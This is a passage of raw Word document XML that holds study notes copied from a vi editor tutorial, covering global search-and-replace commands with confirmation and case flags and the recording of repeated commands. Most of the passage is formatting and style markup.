        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>": 0,$ s/Stock/Equity/g"</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> which actually tells that search from fist to last line.</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>:%s/Stock/Equity/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>gc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    This is similar to first command but with the introduction of "c" it will ask for confirmation </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>:%s/Stock/Equity/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>gci</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br/>
        <w:t>   This is command is global, case insensitive and ask for confirmation. to make it case Sensitive use "I"</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">Read more: </w:t>
      </w:r>
      <w:hyperlink r:id="rId67" w:anchor="ixzz5vuXyai5E" w:history="1">
        <w:r w:rsidRPr="00AD72DF">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:cstheme="majorHAnsi"/>
            <w:color w:val="003399"/>
          </w:rPr>
          <w:t>https://javarevisited.blogspot.com/2011/06/vi-editor-in-unix-example-tutorial-and.html#ixzz5vuXyai5E</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="00482630" w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00482630" w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>Recording and replaying command in VI editor</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="178BC7C3" w14:textId="34CE0789" w:rsidR="00482630" w:rsidRPr="00AD72DF" w:rsidRDefault="008B0010" w:rsidP="008B0010">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="360" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Some times</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> we need to perform some repetitive task and we need to execute same command again and again, you might want to consider using VI editor's recording functionality. Recoding in vim or VI editor can be done by using q and the executing recorded comment by using q@1</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">Read more: </w:t>
      </w:r>
      <w:hyperlink r:id="rId68" w:anchor="ixzz5vuXMim4J" w:history="1">
        <w:r w:rsidRPr="00AD72DF">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
            <w:color w:val="003399"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>https://javarevisited.blogspot.com/2011/06/vi-editor-in-unix-example-tutorial-and.html#ixzz5vuXMim4J</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4E58EB46" w14:textId="06A65AD1" w:rsidR="00482630" w:rsidRPr="00AD72DF" w:rsidRDefault="00482630" w:rsidP="00482630">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:br/>
      </w:r>
    </w:p>
    <w:sectPr w:rsidR="00482630" w:rsidRPr="00AD72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B291D24"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="6FA6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6C4579"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="DA3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0E0C28"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="2626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3"/>
  </w:num>
  <w:num w:numId="5">
    <w:abstractNumId w:val="13"/>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7"/>
  </w:num>
  <w:num w:numId="20">
    <w:abstractNumId w:val="22"/>
  </w:num>
  <w:num w:numId="21">
    <w:abstractNumId w:val="19"/>
  </w:num>
  <w:num w:numId="22">
    <w:abstractNumId w:val="11"/>
  </w:num>
  <w:num w:numId="23">
    <w:abstractNumId w:val="25"/>
  </w:num>
  <w:num w:numId="24">
    <w:abstractNumId w:val="24"/>
  </w:num>
  <w:num w:numId="25">
    <w:abstractNumId w:val="14"/>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630"/>
    <w:rsid w:val="002B2A1D"/>
    <w:rsid w:val="00482630"/>
    <w:rsid w:val="00645252"/>
    <w:rsid w:val="006D3D74"/>
    <w:rsid w:val="0083569A"/>
    <w:rsid w:val="008B0010"/>
    <w:rsid w:val="00A9204E"/>
    <w:rsid w:val="00AD7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8EC5C"/>
  <w15:chartTrackingRefBased/>
  <w15:docId w15:val="{5F49A08B-C68C-4260-8486-C7923A5FB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NormalWeb">
    <w:name w:val="Normal (Web)"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00482630"/>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recommendedtop">
    <w:name w:val="recommended_top"/>
    <w:basedOn w:val="Normal"/>
    <w:rsid w:val="00482630"/>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ilad">
    <w:name w:val="ilad"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="00482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9844">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="202402349">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="581838099">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="240"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="1599412495">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="dotted" w:sz="4" w:space="1" w:color="auto"/>
            <w:left w:val="dotted" w:sz="4" w:space="4" w:color="auto"/>
            <w:bottom w:val="dotted" w:sz="4" w:space="1" w:color="auto"/>
            <w:right w:val="dotted" w:sz="4" w:space="4" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="1817650995">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="240"/>
              <w:divBdr>
                <w:top w:val="dotted" w:sz="4" w:space="1" w:color="auto"/>
                <w:left w:val="dotted" w:sz="4" w:space="4" w:color="auto"/>
                <w:bottom w:val="dotted" w:sz="4" w:space="1" w:color="auto"/>
                <w:right w:val="dotted" w:sz="4" w:space="4" w:color="auto"/>
              </w:divBdr>
            </w:div>
          </w:divsChild>
        </w:div>
        <w:div w:id="1682781171">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="240"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="685205859">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="dotted" w:sz="4" w:space="1" w:color="auto"/>
            <w:left w:val="dotted" w:sz="4" w:space="4" w:color="auto"/>
            <w:bottom w:val="dotted" w:sz="4" w:space="1" w:color="auto"/>
            <w:right w:val="dotted" w:sz="4" w:space="4" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="136262490">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="dotted" w:sz="4" w:space="1" w:color="auto"/>
                <w:left w:val="dotted" w:sz="4" w:space="4" w:color="auto"/>
                <w:bottom w:val="dotted" w:sz="4" w:space="1" w:color="auto"/>
                <w:right w:val="dotted" w:sz="4" w:space="4" w:color="auto"/>
              </w:divBdr>
            </w:div>
          </w:divsChild>
        </w:div>
        <w:div w:id="369840066">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="240"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="1776712095">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="dotted" w:sz="4" w:space="1" w:color="auto"/>
            <w:left w:val="dotted" w:sz="4" w:space="4" w:color="auto"/>
            <w:bottom w:val="dotted" w:sz="4" w:space="1" w:color="auto"/>
            <w:right w:val="dotted" w:sz="4" w:space="4" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="1959870868">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="240"/>
              <w:divBdr>
                <w:top w:val="dotted" w:sz="4" w:space="1" w:color="auto"/>
                <w:left w:val="dotted" w:sz="4" w:space="4" w:color="auto"/>
                <w:bottom w:val="dotted" w:sz="4" w:space="1" w:color="auto"/>
                <w:right w:val="dotted" w:sz="4" w:space="4" w:color="auto"/>
              </w:divBdr>
            </w:div>
          </w:divsChild>
        </w:div>
        <w:div w:id="1660185177">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="240"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="836463709">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="dotted" w:sz="4" w:space="1" w:color="auto"/>
            <w:left w:val="dotted" w:sz="4" w:space="4" w:color="auto"/>
            <w:bottom w:val="dotted" w:sz="4" w:space="1" w:color="auto"/>
            <w:right w:val="dotted" w:sz="4" w:space="4" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="66923104">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="dotted" w:sz="4" w:space="1" w:color="auto"/>
                <w:left w:val="dotted" w:sz="4" w:space="4" w:color="auto"/>
                <w:bottom w:val="dotted" w:sz="4" w:space="1" w:color="auto"/>
                <w:right w:val="dotted" w:sz="4" w:space="4" w:color="auto"/>
              </w:divBdr>
            </w:div>
          </w:divsChild>
        </w:div>
        <w:div w:id="1181630328">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="240"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="1951551265">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="240"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="1143276904">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="240"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="442381748">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="dotted" w:sz="4" w:space="1" w:color="auto"/>
            <w:left w:val="dotted" w:sz="4" w:space="4" w:color="auto"/>
            <w:bottom w:val="dotted" w:sz="4" w:space="1" w:color="auto"/>
            <w:right w:val="dotted" w:sz="4" w:space="4" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="1799179520">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="240"/>
              <w:divBdr>
                <w:top w:val="dotted" w:sz="4" w:space="1" w:color="auto"/>
                <w:left w:val="dotted" w:sz="4" w:space="4" w:color="auto"/>
                <w:bottom w:val="dotted" w:sz="4" w:space="1" w:color="auto"/>
                <w:right w:val="dotted" w:sz="4" w:space="4" w:color="auto"/>
              </w:divBdr>
            </w:div>
          </w:divsChild>
        </w:div>
        <w:div w:id="1334264129">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="240"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="886600620">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="dotted" w:sz="4" w:space="1" w:color="auto"/>
            <w:left w:val="dotted" w:sz="4" w:space="4" w:color="auto"/>
            <w:bottom w:val="dotted" w:sz="4" w:space="1" w:color="auto"/>
            <w:right w:val="dotted" w:sz="4" w:space="4" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="1969582876">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="240"/>
              <w:divBdr>
                <w:top w:val="dotted" w:sz="4" w:space="1" w:color="auto"/>
                <w:left w:val="dotted" w:sz="4" w:space="4" w:color="auto"/>
                <w:bottom w:val="dotted" w:sz="4" w:space="1" w:color="auto"/>
                <w:right w:val="dotted" w:sz="4" w:space="4" w:color="auto"/>
              </w:divBdr>
            </w:div>
          </w:divsChild>
        </w:div>
        <w:div w:id="1213889448">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="240"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="1363820636">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="dotted" w:sz="4" w:space="1" w:color="auto"/>
            <w:left w:val="dotted" w:sz="4" w:space="4" w:color="auto"/>
            <w:bottom w:val="dotted" w:sz="4" w:space="1" w:color="auto"/>
            <w:right w:val="dotted" w:sz="4" w:space="4" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="372387612">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="240"/>
              <w:divBdr>
                <w:top w:val="dotted" w:sz="4" w:space="1" w:color="auto"/>
                <w:left w:val="dotted" w:sz="4" w:space="4" w:color="auto"/>
                <w:bottom w:val="dotted" w:sz="4" w:space="1" w:color="auto"/>
                <w:right w:val="dotted" w:sz="4" w:space="4" w:color="auto"/>
              </w:divBdr>
            </w:div>
          </w:divsChild>
        </w:div>
        <w:div w:id="427895763">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="240"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="785807999">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="dotted" w:sz="4" w:space="1" w:color="auto"/>
            <w:left w:val="dotted" w:sz="4" w:space="4" w:color="auto"/>
            <w:bottom w:val="dotted" w:sz="4" w:space="1" w:color="auto"/>
            <w:right w:val="dotted" w:sz="4" w:space="4" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="1701857910">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="240"/>
              <w:divBdr>
                <w:top w:val="dotted" w:sz="4" w:space="1" w:color="auto"/>
                <w:left w:val="dotted" w:sz="4" w:space="4" w:color="auto"/>
                <w:bottom w:val="dotted" w:sz="4" w:space="1" w:color="auto"/>
                <w:right w:val="dotted" w:sz="4" w:space="4" w:color="auto"/>
              </w:divBdr>
            </w:div>
          </w:divsChild>
        </w:div>
        <w:div w:id="206573626">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="240"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
      </w:divsChild>
    </w:div>
    <w:div w:id="243999334">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="889657057">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1419713459">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1455978425">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1548684706">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="1613124854">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="1618487280">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="dotted" w:sz="4" w:space="1" w:color="auto"/>
            <w:left w:val="dotted" w:sz="4" w:space="4" w:color="auto"/>
            <w:bottom w:val="dotted" w:sz="4" w:space="1" w:color="auto"/>
            <w:right w:val="dotted" w:sz="4" w:space="4" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="103114118">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="dotted" w:sz="4" w:space="1" w:color="auto"/>
                <w:left w:val="dotted" w:sz="4" w:space="4" w:color="auto"/>
                <w:bottom w:val="dotted" w:sz="4" w:space="1" w:color="auto"/>
                <w:right w:val="dotted" w:sz="4" w:space="4" w:color="auto"/>
              </w:divBdr>
            </w:div>
          </w:divsChild>
        </w:div>
        <w:div w:id="809784119">
          <w:marLeft w:val="0"/>
